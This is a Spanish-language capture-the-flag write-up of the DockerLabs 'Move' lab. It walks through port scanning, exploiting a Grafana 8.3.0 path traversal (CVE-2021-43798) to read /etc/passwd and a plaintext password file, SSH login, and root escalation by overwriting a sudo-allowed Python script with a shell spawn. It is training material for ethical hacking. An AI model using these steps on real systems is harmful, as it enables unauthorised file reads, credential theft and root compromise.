---
title: Move
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-06-02
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-move/move_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - ftp
  - ssh
  - http
  - php
  - arbitrary file read
  - path traversal
  - fuzzing web
  - cve
  - sudo abuse
  - os command injection
  - information gathering
  - web analysis
  - cve exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/move:-$ ping -c 1 172.17.0.3             
PING 172.17.0.3 (172.17.0.3) 56(84) bytes of data.
64 bytes from 172.17.0.3: icmp_seq=1 ttl=64 time=0.032 ms

--- 172.17.0.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.032/0.032/0.032/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/move:-$ nmap -p- --open -sS --min-rate 5000 -vvv 172.17.0.3 -n -Pn -oG nmap1
Host: 172.17.0.3 ()	Status: Up
Host: 172.17.0.3 ()	Ports: 21/open/tcp//ftp///, 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///	Ignored State: closed (65531)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/move:-$ nmap -sCV -vvv -p21,22,80,3000 172.17.0.3 -oN nmap2
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    1 0        0            4096 Mar 29  2024 mantenimiento [NSE: writeable]
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 770b3436870d386458c06f4ecd7a3a99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIPBJIszEeSdX26reEr3kMVBaZkDMuE0vMsxFn8KknUZJRzDKlY5eVs2m9ffGfuN4uCaKtnuCyGklffzxXWGSVQ=
|   256 1ec6b291563250a50345f3f732ca7bd6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/kaSLl6P5jIseZeGoVzBe/kBenhuj7zboILbh6LEA3
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Debian))
|_http-server-header: Apache/2.4.58 (Debian)
|_http-title: Apache2 Debian Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
3000/tcp open  ppp?    syn-ack ttl 64
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Jun 2025 00:35:24 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Jun 2025 00:34:54 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Jun 2025 00:34:59 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=6/2%Time=683E432E%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Control
SF::\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpire
SF:s:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\x
SF:20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content
SF:-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protecti
SF:on:\x201;\x20mode=block\r\nDate:\x20Tue,\x2003\x20Jun\x202025\x2000:34:
SF:54\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</
SF:a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCach
SF:e-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPrag
SF:ma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpOn
SF:ly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Op
SF:tions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tue
SF:,\x2003\x20Jun\x202025\x2000:34:59\x20GMT\r\nContent-Length:\x200\r\n\r
SF:\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20
SF:close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessi
SF:onReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/p
SF:lain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Req
SF:uest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\r
SF:\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=
SF:utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r
SF:\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt%
SF:252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opti
SF:ons:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;\
SF:x20mode=block\r\nDate:\x20Tue,\x2003\x20Jun\x202025\x2000:35:24\x20GMT\
SF:r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n");
MAC Address: EE:02:47:0C:A8:BE (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/dockerlabs/move:-$ whatweb 172.17.0.3
http://172.17.0.3 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.58 (Debian)], IP[172.17.0.3], Title[Apache2 Debian Default Page: It works]
```

```terminal
/home/kali/Documents/dockerlabs/move:-$ whatweb 172.17.0.3:3000
http://172.17.0.3:3000 [302 Found] Cookies[redirect_to], Country[RESERVED][ZZ], HttpOnly[redirect_to], IP[172.17.0.3], RedirectLocation[/login], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-XSS-Protection[1; mode=block]
http://172.17.0.3:3000/login [200 OK] Country[RESERVED][ZZ], Grafana[8.3.0], HTML5, IP[172.17.0.3], Script, Title[Grafana], UncommonHeaders[x-content-type-options], X-Frame-Options[deny], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block]
```

---
## Web Analysis

El servicio en el puerto 80 entrega únicamente la página predeterminada de Apache sobre Debian, sin funcionalidad expuesta.

![](assets/img/dockerlabs-writeup-move/move1_1.png)

Durante el fuzzing de de la web, aparece el archivo `maintenance.html`.

```terminal
/home/kali/Documents/dockerlabs/move:-$ gobuster dir -u http://172.17.0.3/ -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -k -r -t 50 -x json,html,php,txt,xml,md
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/maintenance.html     (Status: 200) [Size: 63]
===============================================================
Finished
===============================================================
```

Aunque parece genérico, contiene una pista relevante indicando la existencia de un archivo de texto con información confidencial ubicado en `/tmp/pass.txt`.

![](assets/img/dockerlabs-writeup-move/move1_2.png)

Por otro lado, el puerto 3000 presenta un login panel de Grafana en su versión 8.3.0, confirmada por el banner y el análisis de WhatWeb.

![](assets/img/dockerlabs-writeup-move/move1_3.png)

Esta versión es vulnerable a [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/cve-2021-43798), una falla en plugins malformados que permite leer archivos arbitrarios en el sistema.

```terminal
/home/kali/Documents/dockerlabs/move:-$ searchsploit grafana 8.3.0
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                             | multiple/webapps/50581.py
-------------------------------------------------------------------------------------------------------- ---------------------------------
```

---
## CVE Exploitation

Utilizando el script `50581.py`, es posible explotar la vulnerabilidad de path traversal en Grafana 8.3.0. Esta falla permite leer archivos arbitrarios desde el servidor sin autenticación.

```terminal
/home/kali/Documents/dockerlabs/move:-$ cp /opt/tools/exploitdb/exploits/multiple/webapps/50581.py .

/home/kali/Documents/dockerlabs/move:-$ python3 50581.py -H http://172.17.0.3:3000/
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
...[snip]...
freddy:x:1000:1000::/home/freddy:/bin/bash

Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```

Desde `/etc/passwd` se extrae el nombre de usuario válido `freddy` y desde `/tmp/pass.txt` se recupera la contraseña en texto plano.

Estas credenciales permiten acceso SSH directo al sistema.

```terminal
/home/kali/Documents/dockerlabs/move:-$ ssh freddy@172.17.0.3
freddy@172.17.0.3's password: t9sH76gpQ82UFeZ3GXZS

$ id
uid=1000(freddy) gid=1000(freddy) groups=1000(freddy)
```

---
## Privilege Escalation

El usuario `freddy` puede ejecutar `/usr/bin/python3 /opt/maintenance.py` como `root` sin necesidad de proporcionar una contraseña.

```terminal
$ sudo -l
Matching Defaults entries for freddy on c54a7f75d173:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on c54a7f75d173:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

El archivo `/opt/maintenance.py` es propiedad de freddy y posee permisos de escritura.

```terminal
$ ls -al /opt/maintenance.py
-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 /opt/maintenance.py
```

Esto permite sobreescribir su contenido e inyectar comandos arbitrarios. Reemplazo el script por una línea que lanza una shell y al ejecutar el script con `sudo`, obtengo una shell como `root`.

```terminal
$ echo -e 'import os\nos.system("/bin/bash")' > /opt/maintenance.py
$ sudo /usr/bin/python3 /opt/maintenance.py

# id
uid=0(root) gid=0(root) groups=0(root)
```
